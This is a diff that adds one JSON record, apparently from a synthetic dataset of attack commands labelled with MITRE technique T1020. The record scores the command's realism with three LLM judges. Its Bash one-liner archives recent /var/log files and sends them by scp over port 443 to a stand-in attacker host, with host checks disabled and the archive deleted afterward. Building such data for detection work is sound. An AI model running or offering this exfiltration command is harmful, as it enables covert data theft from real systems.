@@ -1,0 +1,59 @@
+{
+  "technique_id": "T1020",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "ts=$(date +%s); find /var/log -type f -mtime -1 -print0 | tar --null -T - -czf /tmp/recent_logs_${ts}.tgz >/dev/null 2>&1 && scp -q -C -i /root/.ssh/id_rsa -P 443 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null /tmp/recent_logs_${ts}.tgz attacker@203.0.113.7:/var/tmp/.cache/logs/ >/dev/null 2>&1 && rm -f /tmp/recent_logs_${ts}.tgz",
+  "explanation": "Aggregates logs modified in the last 24 hours and exfiltrates them via scp over SSH on port 443 to blend with allowed egress, deleting the local package afterward.",
+  "rationale_steps": [
+    "Select only recently modified log files to reduce volume and focus on fresh data.",
+    "Package with tar to a single compressed archive for efficient transfer.",
+    "Transfer with scp using key-based auth and suppressed host checks for automation.",
+    "Quiet mode and cleanup limit user-visible output and local artifacts."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1020-e93662d8-a5f94499",
+  "source_prompt_hash": "e93662d8",
+  "timestamp_utc": "2025-09-30T09:01:25.255647Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed Bash with correct piping, redirections, and valid flags for find, tar, and scp; no quoting or separator issues.",
+        "semantic_score": 4,
+        "semantic_justification": "It collects recent /var/log files, compresses them, exfiltrates via scp on port 443, and deletes the archive as claimed, but using /root/.ssh/id_rsa conflicts with 'Privilege: None' and some logs may be unreadable, with a non-routable example IP reducing realism.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T02:23:29.492210Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper syntax, balanced quoting, valid flags, appropriate command separators (&&), and correct redirection operators.",
+        "semantic_score": 5,
+        "semantic_justification": "The command fully implements automated exfiltration by finding recent log files, packaging them with tar, transferring them via SCP over port 443 to blend with HTTPS traffic, and cleaning up afterward - all core elements of T1020.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T02:23:32.404793Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with valid syntax, correct command substitutions, and properly used flags and separators.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command's overall design aligns with automated exfiltration, the specified SSH key `/root/.ssh/id_rsa` would be inaccessible with 'Privilege: None,' causing the exfiltration step to fail and significantly reducing its operational plausibility under the stated conditions.",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T02:23:52.295860Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
